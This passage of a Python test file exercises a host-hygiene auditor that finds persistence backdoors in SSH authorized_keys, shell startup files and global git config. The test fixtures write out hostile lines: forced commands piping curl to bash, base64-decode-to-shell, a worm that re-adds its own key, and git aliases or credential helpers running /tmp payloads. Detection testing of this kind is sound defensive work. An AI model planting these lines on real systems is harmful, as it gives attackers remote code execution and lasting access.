        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-dir-writable", ids)

    def test_world_writable_authorized_keys_warns(self):
        d = self._home("ssh-ed25519 AAAAC3Nz me@host\n", file_mode=0o666)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-authorized-keys-writable", ids)

    def test_backdoor_forced_command_is_warning_and_incident_trigger(self):
        ak = 'command="curl http://x|bash",no-pty ssh-ed25519 AAAAC3Nz attacker@evil\n'
        d = self._home(ak)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_ssh_authorized_keys()
        issue = next(i for i in issues if i.id == "ssh-authorized-keys-forced-command")
        self.assertEqual(issue.severity, "warning")
        self.assertIn("ssh-authorized-keys-forced-command", hygiene.INCIDENT_TRIGGER_IDS)
        # remediation is wiper-safe (neutralize before rotate)
        self.assertIn("gh-token-monitor.service", issue.remediation)

    def test_benign_restricted_key_is_info_not_warning(self):
        # A forced command with NO fetch/decode/scratch shape (rsync/borg/git-shell) → info review.
        ak = 'command="/usr/bin/borg serve --restrict-to-path /backup" ssh-ed25519 AAAA bkp@host\n'
        d = self._home(ak)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_ssh_authorized_keys()
        self.assertEqual([i.id for i in issues], ["ssh-authorized-keys-restricted"])
        self.assertEqual(issues[0].severity, "info")

    def test_forced_command_scratch_data_arg_is_info(self):
        # FP fix: a scratch path used as a DATA argument (borg/rrsync --restrict-to-path) is NOT a
        # backdoor — only the executable being in a scratch dir is. Must be info, never a warning.
        for ak in ('command="borg serve --restrict-to-path /var/tmp/repo",restrict ssh-ed25519 AAAA b@h\n',
                   'command="rrsync -ro /srv/tmp/pub" ssh-ed25519 AAAA r@h\n'):
            d = self._home(ak)
            with mock.patch.object(hygiene.Path, "home", return_value=d):
                issues = hygiene.check_ssh_authorized_keys()
            self.assertEqual([i.id for i in issues], ["ssh-authorized-keys-restricted"], ak)

    def test_forced_command_executable_in_scratch_warns(self):
        # ...but the forced EXECUTABLE itself living in a scratch dir IS a backdoor.
        d = self._home('command="/tmp/.x/backdoor" ssh-ed25519 AAAA a@e\n')
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-authorized-keys-forced-command", ids)

    def test_command_in_comment_is_info_not_warning(self):
        # Fail-closed whole-line scan reads command="…" even from the trailing comment (so a backdoor on
        # an odd key-type line is never dropped). A benign comment carries no payload → info, not warning.
        d = self._home('ssh-ed25519 AAAAC3Nz my key command="cleanup /tmp/ cache"\n')
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_ssh_authorized_keys()
        self.assertEqual([(i.id, i.severity) for i in issues],
                         [("ssh-authorized-keys-restricted", "info")])

    def test_cert_key_type_backdoor_is_not_dropped(self):
        # Fail-closed: a forced-command backdoor on a certificate key-type line (unrecognized by any
        # key-type allowlist) must still be flagged, not silently skipped.
        d = self._home('command="/tmp/payload" ssh-ed25519-cert-v01@openssh.com AAAA attacker@evil\n')
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-authorized-keys-forced-command", ids)

    def test_self_propagating_command_is_flagged(self):
        # A worm forced-command that re-adds its own key (contains a key-type substring) then runs a
        # scratch payload must warn — the key-type substring must not derail parsing.
        d = self._home('command="echo ssh-ed25519 AAAA >> ~/.ssh/authorized_keys; /tmp/x"'
                       ' ssh-ed25519 AAAA attacker@evil\n')
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
        self.assertIn("ssh-authorized-keys-forced-command", ids)

    def test_wrapper_and_separator_scratch_exec_warns(self):
        # A scratch executable reached via a wrapper (nohup/env) or after a separator is still a backdoor.
        for ak in ('command="nohup /tmp/payload &" ssh-ed25519 AAAA a@e\n',
                   'command="env X=1 /tmp/payload" ssh-ed25519 AAAA a@e\n'):
            d = self._home(ak)
            with mock.patch.object(hygiene.Path, "home", return_value=d):
                ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
            self.assertIn("ssh-authorized-keys-forced-command", ids, ak)

    def test_plain_keys_are_clean(self):
        ak = ("ssh-ed25519 AAAAC3NzaC1lZDI1 laptop@home\n"
              "ssh-rsa AAAAB3NzaC1yc2E desktop@work\n")
        d = self._home(ak)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_ssh_authorized_keys(), [])

    def test_no_ssh_dir_is_noop(self):
        d = Path(tempfile.mkdtemp())                 # no ~/.ssh at all
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_ssh_authorized_keys(), [])

    def test_group_writable_is_not_flagged(self):
        # per-user-private-group distros (umask 002) make benign files group-writable — must NOT warn.
        d = self._home("ssh-ed25519 AAAA me@host\n", dir_mode=0o770, file_mode=0o660)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_ssh_authorized_keys(), [])


class TestShellProfile(unittest.TestCase):
    """Shell startup files — a fetch-to-shell line runs on every new shell (T1546.004)."""

    def _home_with_rc(self, name: str, body: str):
        d = Path(tempfile.mkdtemp())
        (d / name).write_text(body, encoding="utf-8")
        return d

    def test_fetch_pipe_shell_in_zshrc_warns(self):
        d = self._home_with_rc(".zshrc", "export EDITOR=vim\ncurl -fsSL http://evil | bash\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_shell_profile()
        self.assertEqual([i.id for i in issues], ["shell-profile-fetch-exec"])
        self.assertEqual(issues[0].severity, "warning")
        self.assertIn("shell-profile-fetch-exec", hygiene.INCIDENT_TRIGGER_IDS)

    def test_realistic_rc_with_tool_init_is_clean(self):
        body = (
            '# my zshrc\n'
            'export PATH="$HOME/bin:$PATH"\n'
            'eval "$(rbenv init -)"\n'
            'eval "$(pyenv init -)"\n'
            'eval "$(direnv hook zsh)"\n'
            'eval "$(/opt/homebrew/bin/brew shellenv)"\n'
            'alias ll="ls -la"\n'
            'source ~/.zsh_aliases\n'
            '[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh\n'
        )
        d = self._home_with_rc(".zshrc", body)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])

    def test_commented_out_line_is_clean(self):
        d = self._home_with_rc(".bashrc", "# curl http://x | bash  (disabled)\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])

    def test_base64_decode_exec_warns(self):
        d = self._home_with_rc(".profile", "echo Zm9v | base64 -d | sh\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual([i.id for i in hygiene.check_shell_profile()],
                             ["shell-profile-fetch-exec"])

    def test_fetch_pipe_to_data_interpreter_is_clean(self):
        # FP fix: piping a fetch/decode into a data-CONSUMING interpreter (formatter/filter/diff) is
        # data, not exec. JWT decode, API pretty-print, proc-sub into diff, curl|jq, curl|node script.
        body = (
            'alias jwtd="cut -d. -f2 | base64 -d | python3 -m json.tool"\n'
            'alias ipinfo="curl -s ipinfo.io | python3 -m json.tool"\n'
            'alias apidiff="diff <(curl -s http://a) <(curl -s http://b)"\n'
            'curl -s http://x | jq .\n'
            'curl -s http://x | node format.js\n'
        )
        d = self._home_with_rc(".zshrc", body)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])

    def test_bare_interpreter_pipe_still_warns(self):
        # ...but a BARE interpreter (no program arg) executes stdin as code — still a backdoor.
        d = self._home_with_rc(".bashrc", "curl -fsSL http://evil | python\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual([i.id for i in hygiene.check_shell_profile()], ["shell-profile-fetch-exec"])

    def test_sourcing_fetch_still_warns(self):
        # A shell/source consumer before <(curl …) IS exec (unlike diff <(curl …)).
        d = self._home_with_rc(".zshrc", "source <(curl -sL http://evil.fish)\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual([i.id for i in hygiene.check_shell_profile()], ["shell-profile-fetch-exec"])

    def test_stdin_as_script_dash_warns(self):
        # `python -` reads the program from stdin — identical to bare `curl|python`, must warn.
        d = self._home_with_rc(".bashrc", "curl -fsSL http://evil | python -\n")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual([i.id for i in hygiene.check_shell_profile()], ["shell-profile-fetch-exec"])

    def test_current_dir_argument_to_scratch_is_clean(self):
        # `.` as the current-dir ARGUMENT (rsync/cp/diff source) into a /tmp destination is not
        # dot-source — must not fire (round-2 FP).
        body = ('alias backup="rsync -a . /tmp/backup"\n'
                'alias snap="cp -r . /var/tmp/snap"\n'
                'alias cmp="diff . /tmp/checkout"\n')
        d = self._home_with_rc(".zshrc", body)
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])

    def test_direct_scratch_execution_warns(self):
        # Running a scratch binary directly (after a separator, or via a wrapper) is a backdoor shape.
        for line in ("true && /tmp/.x/run\n", "nohup /dev/shm/rev &\n", "; env A=1 /tmp/p\n"):
            d = self._home_with_rc(".bashrc", line)
            with mock.patch.object(hygiene.Path, "home", return_value=d):
                self.assertEqual([i.id for i in hygiene.check_shell_profile()],
                                 ["shell-profile-fetch-exec"], line)

    def test_no_rc_files_is_noop(self):
        d = Path(tempfile.mkdtemp())
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_shell_profile(), [])


class TestGitConfigExecution(unittest.TestCase):
    """Global git config that makes git exec an attacker command (T1546)."""

    def _with_config(self, pairs):
        return mock.patch.object(hygiene.mechanism, "_git_global_config", return_value=pairs)

    def test_fsmonitor_command_warns(self):
        with self._with_config([("core.fsmonitor", "/tmp/mon.sh")]):
            issues = hygiene.check_git_config_execution()
        self.assertEqual([i.id for i in issues], ["git-fsmonitor-command"])
        self.assertEqual(issues[0].severity, "warning")

    def test_fsmonitor_boolean_true_is_clean(self):
        with self._with_config([("core.fsmonitor", "true")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_hookspath_in_scratch_dir_warns(self):
        with self._with_config([("core.hookspath", "/tmp/hooks")]):
            ids = [i.id for i in hygiene.check_git_config_execution()]
        self.assertEqual(ids, ["git-hookspath-unsafe"])

    def test_hookspath_in_home_is_info(self):
        with self._with_config([("core.hookspath", "/home/u/.githooks")]):
            issues = hygiene.check_git_config_execution()
        self.assertEqual([(i.id, i.severity) for i in issues], [("git-hookspath-set", "info")])

    def test_alias_fetch_exec_warns(self):
        with self._with_config([("alias.sync", "!curl http://x | sh")]):
            ids = [i.id for i in hygiene.check_git_config_execution()]
        self.assertEqual(ids, ["git-config-fetch-exec"])

    def test_benign_config_is_clean(self):
        with self._with_config([("core.pager", "less"), ("core.editor", "vim"),
                                ("alias.st", "status"), ("alias.lg", "log --oneline --graph")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_git_absent_is_noop(self):
        def boom(*a, **k):
            raise FileNotFoundError
        with mock.patch.object(hygiene.subprocess, "run", side_effect=boom):
            self.assertEqual(hygiene.mechanism._git_global_config(), [])

    def test_z_framing_parse(self):
        out = "core.pager\0alias.st\nstatus\0core.editor\nvim\0"
        with mock.patch.object(hygiene.subprocess, "run",
                               return_value=mock.Mock(returncode=0, stdout=out)):
            pairs = hygiene.mechanism._git_global_config()
        self.assertEqual(pairs, [("core.pager", ""), ("alias.st", "status"),
                                 ("core.editor", "vim")])

    def test_fsmonitor_external_helper_is_info_not_warning(self):
        # FP fix: a legit external fsmonitor (watchman wrapper) is non-boolean but not a backdoor.
        for helper in ("rs-git-fsmonitor", "/Users/dev/.cargo/bin/rs-git-fsmonitor",
                       ".git/hooks/query-watchman"):
            with self._with_config([("core.fsmonitor", helper)]):
                issues = hygiene.check_git_config_execution()
            self.assertEqual([(i.id, i.severity) for i in issues],
                             [("git-fsmonitor-external", "info")], helper)
        self.assertNotIn("git-fsmonitor-external", hygiene.INCIDENT_TRIGGER_IDS)

    def test_fsmonitor_backdoor_shape_still_warns(self):
        for bad in ("/tmp/mon.sh", "curl -s http://x | bash"):
            with self._with_config([("core.fsmonitor", bad)]):
                ids = [i.id for i in hygiene.check_git_config_execution()]
            self.assertEqual(ids, ["git-fsmonitor-command"], bad)

    def test_fsmonitor_boolean_variants_are_clean(self):
        for v in ("true", "false", "yes", "no", "on", "off", "1", "0", "TRUE"):
            with self._with_config([("core.fsmonitor", v)]):
                self.assertEqual(hygiene.check_git_config_execution(), [], v)

    def test_alias_fetch_to_data_interpreter_is_clean(self):
        with self._with_config([("alias.prjson",
                                 "!curl -s https://api.github.com/user | python -m json.tool")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_alias_current_dir_to_scratch_is_clean(self):
        # `.` as the current-dir sync source (not dot-source) into /tmp — round-2 FP, must stay clean.
        with self._with_config([("alias.snapshot", "!rsync -a . /tmp/snap")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_alias_scratch_exec_via_bang_sigil_warns(self):
        # A git shell alias runs a scratch payload on `git <alias>` — the `!` sigil must not hide it.
        for v in ("!/tmp/evil.sh", "!bash /tmp/x", "!node /tmp/x.js", "!VERSION=1 /tmp/deploy.sh"):
            with self._with_config([("alias.pwn", v)]):
                self.assertEqual([i.id for i in hygiene.check_git_config_execution()],
                                 ["git-config-fetch-exec"], v)

    def test_credential_helper_scratch_exec_via_bang_warns(self):
        with self._with_config([("credential.helper", "!/tmp/evil")]):
            self.assertEqual([i.id for i in hygiene.check_git_config_execution()],
                             ["git-config-fetch-exec"])

    def test_url_scoped_credential_helper_is_not_evaded(self):
        # A per-URL helper (credential.<url>.helper) execs too — the sub-key variant must not slip.
        with self._with_config([("credential.https://github.com.helper", "!/tmp/evil")]):
            self.assertEqual([i.id for i in hygiene.check_git_config_execution()],
                             ["git-config-fetch-exec"])
        with self._with_config([("credential.https://github.com.helper", "osxkeychain")]):
            self.assertEqual(hygiene.check_git_config_execution(), [])

    def test_benign_bang_aliases_and_helpers_are_clean(self):
        for k, v in [("alias.st", "!git status"), ("alias.visual", "!gitk --all"),
                     ("alias.co", "checkout"),
                     ("credential.helper", "!aws codecommit credential-helper $@"),
                     ("credential.helper", "osxkeychain")]:
            with self._with_config([(k, v)]):
                self.assertEqual(hygiene.check_git_config_execution(), [], f"{k}={v}")

    def test_hookspath_with_tmp_path_segment_is_info(self):
        # A private dir with a 'tmp' path SEGMENT is not the system scratch dir → info, not unsafe.
        with self._with_config([("core.hookspath", "/opt/acme/tmp/githooks")]):
            self.assertEqual([(i.id, i.severity) for i in hygiene.check_git_config_execution()],
                             [("git-hookspath-set", "info")])

    def test_hookspath_with_nul_byte_does_not_crash(self):
        # An embedded-NUL path value must degrade gracefully (Path.stat raises ValueError, not OSError).
        with self._with_config([("core.hookspath", "a\x00b/hooks")]):
            issues = hygiene.check_git_config_execution()   # must not raise
        self.assertIsInstance(issues, list)

    def test_git_config_decodes_leniently(self):
        # A config value with a non-locale-decodable byte must not crash the audit (errors="replace").
        captured = {}
        def fake_run(cmd, **kw):
            captured.update(kw)
            return mock.Mock(returncode=0, stdout="core.pager\0")
        with mock.patch.object(hygiene.subprocess, "run", side_effect=fake_run):
            hygiene.mechanism._git_global_config()
        self.assertEqual(captured.get("errors"), "replace")


class TestMechanismPersistenceComposition(unittest.TestCase):
    """The three new probes must flow through the single audit() composition site (#1161), and
    their active-compromise findings must lead the rotate-LAST runbook."""

    def _only(self, name, sentinel):
        # Mock every OTHER check to [] so audit() yields just the sentinel deterministically.
        others = {"check_credentials", "check_vscode", "check_branch_protection",
                  "check_persistence", "check_runner_persistence", "check_host_artifacts",
                  "check_ssh_authorized_keys", "check_shell_profile",
                  "check_git_config_execution"} - {name}
        ctx = [mock.patch.object(hygiene, o, return_value=[]) for o in others]
        ctx.append(mock.patch.object(hygiene, name, return_value=[sentinel]))
        return ctx

    def test_audit_composes_each_new_probe(self):
        for name, sid in [("check_ssh_authorized_keys", "ssh-authorized-keys-forced-command"),
                          ("check_shell_profile", "shell-profile-fetch-exec"),
                          ("check_git_config_execution", "git-fsmonitor-command")]:
            sentinel = hygiene.HygieneIssue(sid, "warning", "T", "D", "F")
            patches = self._only(name, sentinel)
            for p in patches:
                p.start()
            try:
                ids = [i.id for i in hygiene.audit()]
            finally:
                for p in patches:
                    p.stop()
            self.assertIn(sid, ids)

    def test_active_backdoor_ids_trigger_incident_runbook(self):
        for sid in ("ssh-authorized-keys-forced-command", "shell-profile-fetch-exec",
                    "git-fsmonitor-command", "git-hookspath-unsafe", "git-config-fetch-exec"):
            out = hygiene.render([hygiene.HygieneIssue(sid, "warning", "T", "D", "F")]).lower()
            self.assertIn("rotate last", out, sid)
            self.assertLess(out.index("isolate the host"), out.index("rotate credentials"), sid)

    def test_hardening_only_findings_do_not_trigger_runbook(self):
        # Loose perms / info are hardening, not proof of live compromise → no rotate-LAST lead.
        for sid in ("ssh-dir-writable", "ssh-authorized-keys-writable",
                    "ssh-authorized-keys-restricted", "git-hookspath-set"):
            out = hygiene.render([hygiene.HygieneIssue(sid, "warning", "T", "D", "F")])
            self.assertNotIn("respond in THIS order", out, sid)


class TestBranchProtection(unittest.TestCase):
    def test_noop_without_slug_or_token(self):
        self.assertEqual(hygiene.check_branch_protection(None, "t"), [])
        self.assertEqual(hygiene.check_branch_protection("o/r", None), [])

    def test_unprotected_branch_warns(self):
        with mock.patch("stayawake.lib.adapters.github_api.get_branch_protection",
                        return_value=None):
            issues = hygiene.check_branch_protection("o/r", "tok")
        self.assertEqual([i.id for i in issues], ["branch-unprotected"])

    def test_worm_guard_not_required_warns(self):
        prot = {"required_status_checks": {"contexts": ["build", "lint"]}}
        with mock.patch("stayawake.lib.adapters.github_api.get_branch_protection", return_value=prot), \
             mock.patch("stayawake.bots.security.guard.probe_remote_gate", return_value=GateProbe()):  # no strix wf
            issues = hygiene.check_branch_protection("o/r", "tok")
        self.assertEqual([i.id for i in issues], ["worm-guard-not-required"])

    def test_worm_guard_required_is_clean_via_heuristic(self):
        # No Strix workflow found → fall back to the fuzzy "worm" context match.
        prot = {"required_status_checks": {"contexts": ["Worm Guard — block infected merges"]}}
        with mock.patch("stayawake.lib.adapters.github_api.get_branch_protection", return_value=prot), \
             mock.patch("stayawake.bots.security.guard.probe_remote_gate", return_value=GateProbe()):
            self.assertEqual(hygiene.check_branch_protection("o/r", "tok"), [])

    def test_derived_strix_context_required_is_clean(self):
        # #1230: a job named `strix` produces the context `strix` (no "worm"). When branch protection
        # requires THAT context the gate IS enforced — the old fuzzy match wrongly warned here.
        from stayawake.bots.security.guard import StrixRef, GateProbe
        prot = {"required_status_checks": {"contexts": ["strix"]}}
        with mock.patch("stayawake.lib.adapters.github_api.get_branch_protection", return_value=prot), \
             mock.patch("stayawake.bots.security.guard.probe_remote_gate",
                        return_value=GateProbe(ref=StrixRef(".github/workflows/worm-scan.yml", "strix", "v0.1.4", "tag"))):
            self.assertEqual(hygiene.check_branch_protection("o/r", "tok"), [])

    def test_derived_strix_context_not_required_names_the_actual_context(self):
        from stayawake.bots.security.guard import StrixRef, GateProbe
        prot = {"required_status_checks": {"contexts": ["build"]}}
        with mock.patch("stayawake.lib.adapters.github_api.get_branch_protection", return_value=prot), \
             mock.patch("stayawake.bots.security.guard.probe_remote_gate",
                        return_value=GateProbe(ref=StrixRef(".github/workflows/w.yml", "strix", "v0.1.4", "tag"))):
            issues = hygiene.check_branch_protection("o/r", "tok")
        self.assertEqual([i.id for i in issues], ["worm-guard-not-required"])
        self.assertIn("strix", issues[0].title)      # names the ACTUAL context, not "worm"

    def test_read_failure_does_not_launder_into_a_false_not_required(self):
        # #1243: if the workflows can't be READ (auth/scope/rate/network), we can't determine the
        # gate — stay silent, never warn "not required" (the old remote_gate `or {}` did exactly that).
        from stayawake.bots.security.guard import GateProbe
        prot = {"required_status_checks": {"contexts": ["build"]}}
        with mock.patch("stayawake.lib.adapters.github_api.get_branch_protection", return_value=prot), \
             mock.patch("stayawake.bots.security.guard.probe_remote_gate",
                        return_value=GateProbe(cause="forbidden")):
            self.assertEqual(hygiene.check_branch_protection("o/r", "tok"), [])


class TestAuditRender(unittest.TestCase):
    def test_render_clean(self):
        self.assertIn("no issues", hygiene.render([]))

    def test_render_lists_issues(self):
        issue = hygiene.HygieneIssue("x", "warning", "Title", "Detail", "Fix")
        out = hygiene.render([issue])
        self.assertIn("Title", out)          # title, detail and the fix line all render
        self.assertIn("Detail", out)
        self.assertIn("→ fix", out)
        self.assertIn("Fix", out)

    def test_command_renders_verbatim_on_its_own_line(self):
        # AC8: the copy-pasteable command is on its own line, NOT reflowed into the rationale prose —
        # even a command long enough to exceed the wrap width stays intact on a single line.
        long_cmd = "security delete-internet-password -s github.com   # a comment long enough to wrap"
        issue = hygiene.HygieneIssue("x", "info", "T", "D", "rationale", command=long_cmd)
        out = hygiene.render([issue], width=60)
        self.assertIn(long_cmd, [ln.strip() for ln in out.splitlines()])   # present verbatim, unwrapped

    def test_multiline_command_each_on_its_own_line(self):
        issue = hygiene.HygieneIssue("x", "info", "T", "D", "r", command="cmd-one\ncmd-two")
        rendered = hygiene.render([issue])
        body_lines = [ln.strip() for ln in rendered.splitlines()]
        self.assertIn("cmd-one", body_lines)
        self.assertIn("cmd-two", body_lines)

    def test_reference_renders_details_line(self):
        issue = hygiene.HygieneIssue("x", "info", "T", "D", "r", reference="https://example/doc")
        out = hygiene.render([issue])
        self.assertIn("→ details:", out)
        self.assertIn("https://example/doc", out)

    def test_header_count_matches_rendered_finding_blocks(self):
        # AC8: the "N findings" header must equal the number of rendered finding titles.
        issues = [hygiene.HygieneIssue("a", "warning", "TitleA", "D", "F"),
                  hygiene.HygieneIssue("b", "info", "TitleB", "D", "F")]
        out = hygiene.render(issues)
        self.assertIn("2 findings", out)
        self.assertEqual(sum(ln.count("TitleA") + ln.count("TitleB") for ln in out.splitlines()), 2)

    def test_credential_exposure_only_is_calm_not_full_runbook(self):
        # Proportionality: a lone credential EXPOSURE (no active persistence) gets a calm note, NOT the
        # isolate-and-rebuild runbook — while keeping the don't-bulk-rotate-first (wiper) caveat.
        out = hygiene.render([hygiene.HygieneIssue("git-credentials-plaintext", "warning", "T", "D", "F")])
        self.assertIn("no active host persistence", out.lower())       # honest: exposure, not compromise
        self.assertIn("bulk credential rotation", out.lower())         # keeps the wiper caveat
        self.assertNotIn("Isolate the host from the network", out)     # NOT the full incident runbook
        self.assertNotIn("Take self-hosted CI runners offline", out)

    def test_credential_plus_persistence_still_gets_full_runbook(self):
        # SAFETY: when active persistence accompanies the exposure, the FULL rotate-LAST runbook must
        # lead — the calm credential note must never suppress a real-compromise response.
        out = hygiene.render([
            hygiene.HygieneIssue("git-credentials-plaintext", "warning", "T", "D", "F"),
            hygiene.HygieneIssue("self-hosted-runner-persistence", "warning", "T", "D", "F")])
        self.assertIn("Isolate the host from the network", out)
        self.assertIn("Active host persistence detected", out)
        self.assertNotIn("no active host persistence", out.lower())

    def test_render_omits_incident_sequence_for_non_trigger_issue(self):
        issue = hygiene.HygieneIssue("vscode-autotasks-on", "warning", "T", "D", "F")
        self.assertNotIn("respond in THIS order", hygiene.render([issue]))

    def test_incident_response_sequence_orders_rotation_last(self):
        joined = " ".join(hygiene.incident_response_sequence()).lower()
        self.assertLess(joined.index("isolate"), joined.index("rotate"))
        self.assertLess(joined.index("neutralize"), joined.index("rotate"))
        self.assertIn("gh-token-monitor.service", joined)


if __name__ == "__main__":
    unittest.main()
